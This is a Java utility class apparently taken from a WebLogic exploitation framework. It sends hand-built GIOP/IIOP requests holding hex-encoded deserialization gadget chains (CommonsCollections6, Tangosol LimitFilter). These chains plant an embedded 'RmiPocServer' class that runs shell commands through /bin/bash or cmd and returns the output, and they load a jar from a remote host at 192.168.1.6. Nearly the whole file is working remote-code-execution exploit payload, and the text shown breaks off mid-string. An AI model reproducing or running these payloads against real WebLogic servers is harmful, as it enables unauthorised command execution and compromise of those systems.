/*
 * Copyright  2020.  r4v3zn
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *  http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.weblogic.framework.utils;

import cn.hutool.core.util.HexUtil;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.Socket;
import java.util.Arrays;

/**
 * Title: SocketUtils
 * Descrption: socket 工具类
 * Date:2020/3/23 23:06
 * @version 1.0.0
 */
public class SocketUtils {
    /**
     * 获取 NameService
     */
    private static final String NAME_SERVICE = "47494f50010200030000001700000002000000000000000b4e616d6553657276696365";

    /**
     * GIOP Magic: GIOP
     */
    private static final String GIOP_MAGIC = "47494f50";

    /**
     * GIOP Version: 1.2
     */
    private static final String GIOP_VERSION = "0102";

    /**
     * GIOP Message type: Requests (0)
     */
    private static final String GIOP_MESSAGE_TYPE = "00";

    /**
     * GIOP Message size: 0
     */
    private static String GIOP_MESSAGE_SIZE = "00000000";

    /**
     * 私有化构造防止被实例化
     */
    private SocketUtils(){}

    /**
     * 获取 Name Service
     * @param socket socket
     * @return 响应结果
     * @throws Exception
     */
    public static byte[] getNameService(Socket socket) throws Exception {
        return send(NAME_SERVICE, socket);
    }

    /**
     * op=_non_existent
     * @param socket socket
     * @param key key
     * @param natHost nat host
     * @return 响应结果
     */
    public static byte[] operationNonExistent(Socket socket, String key, String natHost) throws Exception {
        return operationNonExistent(socket, key, natHost,true);
    }

    /**
     * op=_non_existent
     * @param socket socket
     * @param key key
     * @param natHost nat host
     * @param getNewKey 是否为新的 key
     * @return 响应结果
     */
    public static byte[] operationNonExistent(Socket socket, String key, String natHost, Boolean getNewKey) throws Exception {
        // key length
        String keyLength = IIOPUtils.addZeroForNum(Integer.toHexString(key.length()/2), 8);
        String msg = null;
        if (getNewKey){
            msg = "000000030300000000000000"+keyLength+key+"0000000e5f6e6f6e5f6578697374656e7400000000000006000000050000001800000000000000010000000a3132372e302e312e3100d80100000006000000f0000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000100000000000000b4000102000000000a3132372e302e312e3100d8010000006400424541080103000000000100000000000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000331320000000000014245412c000000100000000000000000171db96932f5c18300000001000000010000002c0000000000010020000000030001002000010001050100010001010000000003000101000001010905010001000000010000000c0000000000010020050100010000000f0000002000000000000000000000000000000001000000000000000001000000000000004245410000000005000c020103000000"+setIpHex(natHost);
        }else{
            msg = "000000040300000000000000"+keyLength+key+"0000000e5f6e6f6e5f6578697374656e7400000000000001"+setIpHex(natHost);
        }
        // msg = "47494f5001020000"+addZeroForNum(Integer.toHexString(msg.length()/2),8)+msg;
        msg = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE + IIOPUtils.addZeroForNum(Integer.toHexString(msg.length()/2),8) + msg;
        return send(msg, socket);
    }

    /**
     * op=rebind_any
     * @param socket socket
     * @return rebindAny Info
     */
    public static byte[] rebindAny(Socket socket, String version){
        return null;
    }

    /**
     * CommonsCollections6 链 rebindAny
     * @param socket socket
     * @param bindName 绑带名称
     * @param key iiop key
     * @return 响应结果
     */
    public static byte[] rebindAnyCommonsCollections6(Socket socket, String bindName, String key) throws Exception {
        // request id
        String requestId = "00000004";
        // response flags
        String responseFlags = "03";
        // reserved
        String reserved = "000000";
        // target address
        String targetAddress = "0000"+"0000";
        // key length
        String keyLength = IIOPUtils.addZeroForNum(Integer.toHexString(key.length()/2), 8);
        // key
        // operation length + operation(rebind_any)
        String operationLength = "00"+"00000b72"+"6562696e645f616e7900";
        // serviceContextList 00
        String serviceContextList = "0000000000";
        String header = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE + GIOP_MESSAGE_SIZE + requestId+ responseFlags+reserved+targetAddress+keyLength+key+operationLength+serviceContextList;
        serviceContextList += calculationPadding(header);
        String stubData = "000000010000000568656c6c6f00000000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0a00000038524d493a6a6176612e7574696c2e486173685365743a414331313745323846453336353837413a42413434383539353936423842373334000000001101010000000000023f40000000000001000000007fffff0a0000005b524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472793a423430423741333646374435314444313a384141444432394233394331314644420000000000440000001e0000003c000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000001000000000000001b000000007fffff0a0000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000700000003666f6f00fffffffd7fffff0a00000051524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61703a353842424138454633304330394645423a364545353934383239453739313039340000000000000002010100007fffff0a00000061524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d65723a353639313138463941313930393646313a33304337393745433238374139373034000000007fffff0a00000043524d493a5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723b3a30303030303030303030303030303030000000000004000000077fffff0a00000062524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d65723a443036433732413043333443423031463a35383736393031313431303242313934000000000000600000001d000000580000000000000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a4346424630324346353239343137364200000000010000000000000000000000007fffff0a00000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a43464246303243463532393431373642007fffff0afffffffffffffd840000000400000000fffffff87fffff0afffffffffffffd6c000000420000003e524d493a6f72672e6d6f7a696c6c612e636c61737366696c652e446566696e696e67436c6173734c6f616465723a303030303030303030303030303030300000fffffffa7fffff0a00000061524d493a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d65723a314337314234323434434436334231423a38374538464636423742374343453338000000007fffff0a00000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a303030303030303030303030303030300000000000000060000000010000001d000000540000000000000039524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a3243374535353033443942463935353300000000000000010000000000000000000000007fffff0a00000039524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a32433745353530334439424639353533000000000000000400000000fffffff97fffff0afffffffffffffbc0000000120000000e676574436f6e7374727563746f720000fffffff97fffff0affffffffffffff8400000004000000017fffff0afffffffffffffdb400000008fffffffffffffdec7fffff0afffffffffffffb6c0000003c00000038524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a32433745353530334439424639353533fffffffa7fffff0afffffffffffffe047fffff0afffffffffffffe6400000050000000010000001d000000440000000000000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a3030303030303030303030303030303000000000000000010000000000000000000000007fffff0afffffffffffffe040000000400000000fffffff97fffff0afffffffffffffa980000000f0000000b6e6577496e7374616e636500fffffff97fffff0afffffffffffffe6000000004000000017fffff0afffffffffffffc9000000008fffffffffffffcc87fffff0afffffffffffffa480000002c00000028524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a30303030303030303030303030303030fffffffa7fffff0afffffffffffffcf07fffff0afffffffffffffd5000000048000000020000001e0000003c000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000001000000000000001b000000007fffff0afffffffffffff9a4000000100000000c526d69506f63536572766572fffffff8000000380000001d000000300000000000000018524d493a5b423a3030303030303030303030303030303000000000010000000000000000000000007fffff0a00000018524d493a5b423a3030303030303030303030303030303000000010f4000010f0cafebabe0000003200db0a0039007a07007b0a0002007a07007c0a0004007a0b007d007e07007f0a000700800a000200810800820a001d00830a001d00840a001d00850a000200860800870a001d008808008907008a0a0012007a08008b0a008c008d08008e0a001d008f0800900800910a001200920800930a0012009407009508005a0800960800970800980800990a009a009b0a009a009c0a009d009e08009f0700a00700a10a009d00a20800a30a002800a40a002700a50a009d00a60800a70a002700a80a001200a90a000200aa0a009d00ab0700ac0700ad0700ae0800af0800b00b00b100b20700b30700b40100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c526d69506f635365727665723b010007726d6942696e64010015284c6a6176612f6c616e672f537472696e673b2956010009726d69536572766572010007636f6e746578740100164c6a617661782f6e616d696e672f436f6e746578743b010001650100154c6a6176612f6c616e672f457863657074696f6e3b01000a636c69656e744e616d650100124c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c6507007f0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b2956010004617267730100135b4c6a6176612f6c616e672f537472696e673b010009706f635365727665720100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b295601000173010002733101000a457863657074696f6e730700b50100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b010003636d6401000873706c69744172720100026f7301000765786563436d64010038284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100046c696e650100154c6a6176612f696f2f494f457863657074696f6e3b010008636c69656e744f73010006726573756c740100194c6a6176612f6c616e672f537472696e674275696c6465723b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000662756672496e0100184c6a6176612f696f2f42756666657265645265616465723b010009627566724572726f7201000a65786563757465436d6407007b07009507008a0700b60700a00700500700ac0700ad0700ae0700b701000b636c6f736553747265616d010016284c6a6176612f696f2f436c6f736561626c653b295601000673747265616d0100134c6a6176612f696f2f436c6f736561626c653b01000a536f7572636546696c65010011526d69506f635365727665722e6a6176610c003b003c01000c526d69506f6353657276657201001b6a617661782f6e616d696e672f496e697469616c436f6e746578740700b80c00b900ba0100136a6176612f6c616e672f457863657074696f6e0c00bb003c0c0042004301000240400c00bc00bd0c00be00bf0c00c000bf0c005d005e0100000c00c100c2010010636f6d6d6f6e64206e6f74206e756c6c0100176a6176612f6c616e672f537472696e674275696c6465720100076f732e6e616d650700c30c00c4005901000377696e0c00c500c601000470696e670100022d6e0c00c700c8010005202d6e20340c00c900bf0100106a6176612f6c616e672f537472696e670100022f63010005202d7420340100092f62696e2f626173680100022d630700ca0c00cb00cc0c00cd00ce0700b60c00cf00d001000777696e646f77730100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720c00d100d201000347424b0c003b00d30c003b00d40c00d500d20100055554462d380c00d600bf0c00c700d70c007400750c00d8003c01001e6a6176612f6c616e672f496e746572727570746564457863657074696f6e0100246a6176612f696f2f556e737570706f72746564456e636f64696e67457863657074696f6e0100136a6176612f696f2f494f457863657074696f6e0100252065786563757465206572726f722c6d73673a206e6f7420666f756e6420636f6d6d6f6e6401000c2065786563757465206f6b210700d90c00da003c0100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100186a6176612f726d692f52656d6f7465457863657074696f6e0100116a6176612f6c616e672f50726f636573730100136a6176612f6c616e672f5468726f7761626c650100146a617661782f6e616d696e672f436f6e74657874010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b295601000f7072696e74537461636b547261636501000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100047472696d01001428294c6a6176612f6c616e672f537472696e673b01000b746f4c6f77657243617365010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b01002a284c6a6176612f696f2f496e70757453747265616d3b4c6a6176612f6c616e672f537472696e673b2956010013284c6a6176612f696f2f5265616465723b295601000e6765744572726f7253747265616d010008726561644c696e6501001c2843294c6a6176612f6c616e672f537472696e674275696c6465723b01000764657374726f790100116a6176612f696f2f436c6f736561626c65010005636c6f73650021000200390001003a000000070001003b003c0001003d0000002f00010001000000052ab70001b100000002003e00000006000100000012003f0000000c0001000000050040004100000001004200430001003d000000a00003000400000021bb000259b700034dbb000459b700054e2d2b2cb900060300a700084d2cb60008b1000100000018001b00070003003e0000001e00070000001b0008001c0010001d00180020001b001e001c001f00200021003f0000003400050008001000440041000200100008004500460003001c000400470048000200000021004000410000000000210049004a0001004b0000000700025b07004c040009004d004e0001003d0000005c0002000300000012bb000259b700034c2a03324d2b2cb60009b100000002003e0000001200040000002400080025000c002600110027003f00000020000300000012004f005000000008000a005100410001000c00060049004a00020001005200530002003d0000003f0000000300000001b100000002003e0000000600010000002c003f00000020000300000001004000410000000000010054004a0001000000010055004a0002005600000004000100570001005800590002003d00000076000300040000001e2b120ab6000b4d2c03324c2c04324e2db6000cb6000d4e2a2b2db6000eb000000002003e0000001600050000003000070031000b0032000f003300170034003f0000002a00040000001e0040004100000000001e005a004a000100070017005b00500002000f000f005c004a0003005600000004000100570001005d005e0002003d000004530006000c0000021d2bc6000c120f2bb600109900061211b02bb6000c4cbb001259b700134e013a04013a05013a061214b800153a071907b6000d3a07013a0819071216b600179900402b1218b600179900202b1219b600179a0017bb001259b700132bb6001a121bb6001ab6001c4c06bd001d5903121e535904121f5359052b533a08a7003d2b1218b600179900202b1219b600179a0017bb001259b700132bb6001a1220b6001ab6001c4c06bd001d5903122153590412225359052b533a08b800231908b600243a041904b60025572c1226b60017990034bb002759bb0028591904b60029122ab7002bb7002c3a05bb002759bb0028591904b6002d122ab7002bb7002c3a06a70031bb002759bb0028591904b60029122eb7002bb7002c3a05bb002759bb0028591904b6002d122eb7002bb7002c3a06013a091905b6002f593a09c600122d1909b6001a100ab6003057a7ffe91906b6002f593a09c600122d1909b6001a100ab6003057a7ffe91905b800311906b800311904c600841904b60032a7007c3a091905b800311906b800311904c6006b1904b60032a700633a091905b800311906b800311904c600521904b60032a7004a3a09bb001259b700132bb6001a1236b6001ab6001c3a0a1905b800311906b800311904c600081904b60032190ab03a0b1905b800311906b800311904c600081904b60032190bbf2dc6000c120f2db60010990017bb001259b700132bb6001a1237b6001ab6001cb02db6001cb0000800b80167017e003300b801670197003400b8016701b0003500b8016701de0000017e018001de00000197019901de000001b001c701de000001de01e001de00000003003e000000ea003a0000003f000d00400010004200150043001d0044002000450023004600260047002d0048003400490037004a0041004b0053004c0067004e007e00500090005100a4005300b8005600c2005700c8005800d1005900e8005a0102005c0119005d0130005f01330060013e0061014d0063015800640167006b016c006c0171006d0176006e017e00660180006b0185006c018a006d018f006e019700670199006b019e006c01a3006d01a8006e01b0006801b2006901c7006b01cc006c01d1006d01d6006e01db006901de006b01e5006c01ea006d01ef006e01f4007001f700710204007202180074003f00000070000b01330034005f004a000901b2002c0047006000090000021d0040004100000000021d005a004a00010000021d0061004a0002001d0200006200630003002001fd006400650004002301fa006600670005002601f7006800670006002d01f0005c004a0007003701e6006900500008004b0000007e00140d02ff0056000907006a07006b07006b07006c07006d07006e07006e07006b07006f0000162513fb00492dfc000207006b19fa0019560700705807007158070072fd002a07007207006bff0002000907006a07006b07006b07006c07006d07006e07006e07006b07006f0001070073fe00150000070073f800020c1300560000000400010057000a007400750001003d0000005e000100020000000f2ac6000d2ab900380100a700044cb100010004000a000d00070003003e000000160005000000790004007b000a007d000d007c000e007f003f0000000c00010000000f007600770000004b0000000700024d07004c0000010078000000020079fffffff97fffff0affffffffffffe8280000000f0000000b646566696e65436c61737300fffffff97fffff0affffffffffffebf000000004000000027fffff0affffffffffffea2000000008ffffffffffffea587fffff0affffffffffffe7d8000000260000002249444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000fffffff87fffff0affffffffffffe9cc00000008ffffffffffffea047fffff0affffffffffffe7840000001b00000017524d493a5b423a3030303030303030303030303030303000fffffffa7fffff0affffffffffffea3c7fffff0affffffffffffea9c00000048000000020000001e0000003c000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000001000000000000001b000000007fffff0affffffffffffe6f000000008000000046d61696efffffff80000005c0000001d000000540000000000000039524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a3243374535353033443942463935353300000000000000010000000000000000000000007fffff0affffffffffffea6000000004000000017fffff0affffffffffffe89000000008ffffffffffffe8c87fffff0affffffffffffe6480000003d00000039524d493a5b4c6a6176612e6c616e672e537472696e673b3a303731444138424537463937313132383a41304630413433383741334242333432000000fffffff97fffff0affffffffffffe5f40000000d000000096765744d6574686f64000000fffffff97fffff0affffffffffffe9bc0000001400000002fffffffffffffdc8ffffffffffffea2cfffffffa7fffff0affffffffffffe8907fffff0affffffffffffe8f000000090000000020000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000001d000000440000000000000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a3030303030303030303030303030303000000000000000010000000000000000000000007fffff0affffffffffffe85000000060000000010000001d00000054000000000000003a524d493a5b4c6a6176612e6c616e672e537472696e673b3a303731444138424537463937313132383a41304630413433383741334242333432000000000000010000000000000000000000007fffff0a0000003a524d493a5b4c6a6176612e6c616e672e537472696e673b3a303731444138424537463937313132383a4130463041343338374133424233343200000000000004000000017fffff0affffffffffffe4400000001400000010";
        stubData += HexUtil.encodeHexStr(bindName);
        stubData += "fffffff97fffff0affffffffffffe4180000000a00000006696e766f6b650000fffffff97fffff0affffffffffffe7e400000004000000027fffff0affffffffffffe61400000008ffffffffffffe64c7fffff0affffffffffffe3cc0000002900000025524d493a6a6176612e6c616e672e4f626a6563743a30303030303030303030303030303030000000fffffff800000008ffffffffffffe924fffffffa7fffff0affffffffffffe4dc000000580000001d000000500000000000000038524d493a6a6176612e6c616e672e496e74656765723a343736393346464234464535373946343a3132453241304134463738313837333800000000010000000000000000000000007fffff0a00000038524d493a6a6176612e6c616e672e496e74656765723a343736393346464234464535373946343a31324532413041344637383138373338000000000400000001fffffffc00000001000000007fffff0a00000038524d493a6a6176612e7574696c2e486173684d61703a383635373335363841323131433031313a303530374441433143333136363044310000000014010100003f400000000000000000001000000000ffffffff";
//        stubData = "";
        // Jta
//        stubData = "000000010000000568656c6c6f00000000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000074524d493a636f6d2e6265612e636f72652e72657061636b616765642e737072696e676672616d65776f726b2e7472616e73616374696f6e2e6a74612e4a74615472616e73616374696f6e4d616e616765723a304433303438453037423144334237423a3445463345434642423632383938324600ffffffff0001010000000000000001010100000000000000000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000";
//        String url = "ldap://192.168.1.6:1099/poc";
//        stubData += addZeroForNum(Integer.toHexString(url.length()),8);
//        stubData += HexUtil.encodeHexStr(url);
        String body = requestId+ responseFlags+reserved+targetAddress+keyLength+key+operationLength+serviceContextList + stubData;
        GIOP_MESSAGE_SIZE = IIOPUtils.addZeroForNum(Integer.toHexString(body.length()/2),8);
        header = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE;
        String content = header + GIOP_MESSAGE_SIZE + body;
        return send(content, socket);
    }

    public static String rebindAnyLimitFilter(String bindName,String javascriptUrl) throws MalformedURLException {
        String bindNameHex = HexUtil.encodeHexStr(bindName);
        String stubData = "000000010000000568656c6c6f00000000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0a00000055524d493a6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6e3a463745363630454236383134424142383a44344537444141423633324434363430000000000000001001010000ffffffffffffff94000000007fffff0a00000045524d493a5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b3a434433384639393330454138414145433a363130394335394132363336444438350000000000000004000000027fffff0a00000042524d493a6a6176612e6c616e672e537461636b5472616365456c656d656e743a434433384639393330454138414145433a36313039433539413236333644443835000000000000040000002f7fffff0a0000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000024000000207061796c6f6164732e696d706c2e4c696d697446696c7465725061796c6f6164fffffffc7fffff0affffffffffffffa40000001b000000174c696d697446696c7465725061796c6f61642e6a61766100fffffffc7fffff0affffffffffffff740000000d000000096765744f626a656374000000fffffffd7fffff0afffffffffffffefc00000004000000287fffff0affffffffffffff3c0000000b000000074e65774d61696e00fffffffc7fffff0affffffffffffff1c000000100000000c4e65774d61696e2e6a617661fffffffc7fffff0afffffffffffffef800000008000000046d61696efffffffe7fffff0a00000052524d493a6a6176612e7574696c2e436f6c6c656374696f6e735c5530303234556e6d6f6469666961626c654c6973743a304642324435323441384638303441333a464330463235333142354543384531300000007fffff0a0000003a524d493a6a6176612e7574696c2e41727261794c6973743a463635353135344633323831353338303a373838314432314439394337363139440000000000000c010100000000000000000000fffffffd00000008ffffffffffffffa0fffffffe0000006c0000001d00000064000000000000004b524d493a636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c7465723a434438423846313545354231324344463a393534453435393042453839383635460000000000010000000000000000000000007fffff0a0000004b524d493a636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c7465723a434438423846313545354231324344463a3935344534353930424538393836354600000000000800000000000000007fffff0a00000053524d493a636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f723a394539424337463046324146443043443a34333542323530423732463633444235000000000004000000007fffff0a00000039524d493a5b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b3a303030303030303030303030303030300000000000000004000000077fffff0a00000056524d493a636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f723a323646433332364241354246454141463a3146363246353634423935314236313400000000000004000000007fffff0a00000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a303030303030303030303030303030300000000000000060000000010000001d000000540000000000000039524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a3243374535353033443942463935353300000000000000010000000000000000000000007fffff0a00000039524d493a5b4c6a6176612e6c616e672e436c6173733b3a303731444138424537463937313132383a324337453535303344394246393535330000000000000004000000017fffff0a00000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a43464246303243463532393431373642007fffff0afffffffffffffb040000000400000000fffffff77fffff0afffffffffffffaec0000003900000035524d493a5b4c6a6176612e6e65742e55524c3b3a464236354546353942344333363138423a39363235333733363141464345343732000000fffffffa7fffff0afffffffffffffa9c000000120000000e676574436f6e7374727563746f720000fffffffb7fffff0afffffffffffffdd800000004000000007fffff0afffffffffffffe2c00000050000000010000001d000000440000000000000029524d493a5b4c6a6176612e6c616e672e4f626a6563743b3a3030303030303030303030303030303000000000000000010000000000000000000000007fffff0afffffffffffffdcc0000005c000000010000001d000000500000000000000036524d493a5b4c6a6176612e6e65742e55524c3b3a464236354546353942344333363138423a39363235333733363141464345343732000000000000010000000000000000000000007fffff0a00000036524d493a5b4c6a6176612e6e65742e55524c3b3a464236354546353942344333363138423a3936323533373336314146434534373200000000000004000000017fffff0a00000033524d493a6a6176612e6e65742e55524c3a464236354546353942344333363138423a3936323533373336314146434534373200000000000c01010000ffffffff00001f907fffff0afffffffffffff90000000014000000103139322e3136382e312e363a38303830fffffff67fffff0afffffffffffff8d80000001b000000172f636f6d2e6265612e6a6176617363726970742e6a617200fffffff67fffff0afffffffffffff8a80000000f0000000b3139322e3136382e312e3600fffffff67fffff0afffffffffffff884000000080000000468747470fffffff60000000400000000fffffffa7fffff0afffffffffffff85c0000000f0000000b6e6577496e7374616e636500fffffffb7fffff0afffffffffffffb9c00000004000000007fffff0afffffffffffffbf000000048000000010000001e0000003c000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000001000000000000001b000000007fffff0afffffffffffff7cc0000002d000000296f72672e6d6f7a696c6c612e636c61737366696c652e446566696e696e67436c6173734c6f61646572000000fffffffa7fffff0afffffffffffff7880000000d000000096c6f6164436c617373000000fffffffb7fffff0afffffffffffffac8000000100000000000000000fffffffffffffeecfffffffb7fffff0afffffffffffffaa400000004000000007fffff0afffffffffffffaf800000048000000020000001e0000003c000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000001000000000000001b000000007fffff0afffffffffffff6d4000000100000000c526d69506f63536572766572fffffff9000000380000001d000000300000000000000018524d493a5b423a3030303030303030303030303030303000000000010000000000000000000000007fffff0a00000018524d493a5b423a3030303030303030303030303030303000000010f4000010f0cafebabe0000003200db0a0039007a07007b0a0002007a07007c0a0004007a0b007d007e07007f0a000700800a000200810800820a001d00830a001d00840a001d00850a000200860800870a001d008808008907008a0a0012007a08008b0a008c008d08008e0a001d008f0800900800910a001200920800930a0012009407009508005a0800960800970800980800990a009a009b0a009a009c0a009d009e08009f0700a00700a10a009d00a20800a30a002800a40a002700a50a009d00a60800a70a002700a80a001200a90a000200aa0a009d00ab0700ac0700ad0700ae0800af0800b00b00b100b20700b30700b40100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c526d69506f635365727665723b010007726d6942696e64010015284c6a6176612f6c616e672f537472696e673b2956010009726d69536572766572010007636f6e746578740100164c6a617661782f6e616d696e672f436f6e746578743b010001650100154c6a6176612f6c616e672f457863657074696f6e3b01000a636c69656e744e616d650100124c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c6507007f0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b2956010004617267730100135b4c6a6176612f6c616e672f537472696e673b010009706f635365727665720100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b295601000173010002733101000a457863657074696f6e730700b50100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b010003636d6401000873706c69744172720100026f7301000765786563436d64010038284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100046c696e650100154c6a6176612f696f2f494f457863657074696f6e3b010008636c69656e744f73010006726573756c740100194c6a6176612f6c616e672f537472696e674275696c6465723b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000662756672496e0100184c6a6176612f696f2f42756666657265645265616465723b010009627566724572726f7201000a65786563757465436d6407007b07009507008a0700b60700a00700500700ac0700ad0700ae0700b701000b636c6f736553747265616d010016284c6a6176612f696f2f436c6f736561626c653b295601000673747265616d0100134c6a6176612f696f2f436c6f736561626c653b01000a536f7572636546696c65010011526d69506f635365727665722e6a6176610c003b003c01000c526d69506f6353657276657201001b6a617661782f6e616d696e672f496e697469616c436f6e746578740700b80c00b900ba0100136a6176612f6c616e672f457863657074696f6e0c00bb003c0c0042004301000240400c00bc00bd0c00be00bf0c00c000bf0c005d005e0100000c00c100c2010010636f6d6d6f6e64206e6f74206e756c6c0100176a6176612f6c616e672f537472696e674275696c6465720100076f732e6e616d650700c30c00c4005901000377696e0c00c500c601000470696e670100022d6e0c00c700c8010005202d6e20340c00c900bf0100106a6176612f6c616e672f537472696e670100022f63010005202d7420340100092f62696e2f626173680100022d630700ca0c00cb00cc0c00cd00ce0700b60c00cf00d001000777696e646f77730100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720c00d100d201000347424b0c003b00d30c003b00d40c00d500d20100055554462d380c00d600bf0c00c700d70c007400750c00d8003c01001e6a6176612f6c616e672f496e746572727570746564457863657074696f6e0100246a6176612f696f2f556e737570706f72746564456e636f64696e67457863657074696f6e0100136a6176612f696f2f494f457863657074696f6e0100252065786563757465206572726f722c6d73673a206e6f7420666f756e6420636f6d6d6f6e6401000c2065786563757465206f6b210700d90c00da003c0100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100186a6176612f726d692f52656d6f7465457863657074696f6e0100116a6176612f6c616e672f50726f636573730100136a6176612f6c616e672f5468726f7761626c650100146a617661782f6e616d696e672f436f6e74657874010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b295601000f7072696e74537461636b547261636501000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100047472696d01001428294c6a6176612f6c616e672f537472696e673b01000b746f4c6f77657243617365010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a